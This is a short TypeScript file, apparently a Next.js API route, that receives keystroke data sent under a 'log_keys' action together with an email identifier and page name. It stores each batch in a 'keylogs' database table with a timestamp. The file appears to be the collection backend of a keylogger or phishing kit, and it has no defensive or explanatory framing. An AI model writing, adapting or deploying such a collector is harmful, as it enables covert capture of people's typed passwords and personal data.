import { NextRequest, NextResponse } from 'next/server';
import { getDb } from '@/lib/db';

export async function POST(req: NextRequest) {
  try {
    const formData = await req.formData();
    const action = formData.get('action') as string;
    if (action !== 'log_keys') {
      return NextResponse.json({ error: 'Invalid action' }, { status: 400 });
    }

    const keysRaw = (formData.get('keys') as string) || '';
    if (!keysRaw) return NextResponse.json({ status: 'empty' });

    const keysData = JSON.parse(keysRaw);
    if (!keysData || typeof keysData !== 'object') {
      return NextResponse.json({ status: 'invalid' });
    }

    const emailId = (formData.get('email_id') as string) || '';
    const pageView = (formData.get('page_view') as string) || '';
    const fullLog = JSON.stringify({ keys: keysData, page: pageView, time: new Date().toISOString() });

    const db = getDb();
    db.prepare('INSERT INTO keylogs (email_identifier, key_data, field_context, full_log) VALUES (?, ?, ?, ?)')
      .run(emailId, JSON.stringify(keysData), pageView, fullLog);

    return NextResponse.json({ status: 'ok' });
  } catch {
    return NextResponse.json({ status: 'error' }, { status: 500 });
  }
}
